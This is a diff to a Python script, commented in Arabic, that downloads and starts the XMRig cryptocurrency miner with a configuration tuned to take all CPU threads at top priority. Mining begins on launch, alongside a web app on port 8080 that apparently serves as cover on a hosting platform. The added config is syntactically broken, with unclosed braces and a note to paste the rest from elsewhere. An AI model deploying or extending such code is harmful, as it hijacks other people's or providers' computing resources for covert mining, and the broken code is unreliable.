@@ -40,7 +40,30 @@ def run_xmrig():
     xmrig_exe = os.path.join(xmrig_dir, "xmrig-6.24.0", "xmrig")
     os.chmod(xmrig_exe, 0o755)
 
-    config = { /* نفس الإعدادات القوية اللي عندك هنا */ }
+    config = { 
+            "autosave": True,
+    "background": False,
+    "colors": False,
+    "donate-level": 0,  # لا تبرع
+    "cpu": {
+        "enabled": True,
+        "huge-pages": True,
+        "huge-pages-jit": True,
+        "hw-aes": True,
+        "priority": 5,  # أعلى أولوية
+        "memory-pool": False,
+        "yield": False,  # لا تنازل عن CPU
+        "max-threads-hint": 100,  # كل الـ threads
+        "asm": True,
+        "randomx": {
+            "init": -1,  # كل الـ cores للـ init
+            "mode": "fast",  # أسرع وضع
+            "1gb-pages": True,  # قسري لـ 1GB pages
+            "numa": True,
+            "scratchpad_prefetch_mode": 1  # تحسين prefetch
+
+
+    }
     # (انسخ نفس الـ config اللي كتبته سابقًا بالكامل)
 
     config_path = os.path.join(xmrig_dir, "config.json")
@@ -70,3 +93,4 @@ def start_mining():
 if __name__ == "__main__":
     start_mining()        # يشتغل التعدين فورًا
     app.run(host="0.0.0.0", port=8080)
+
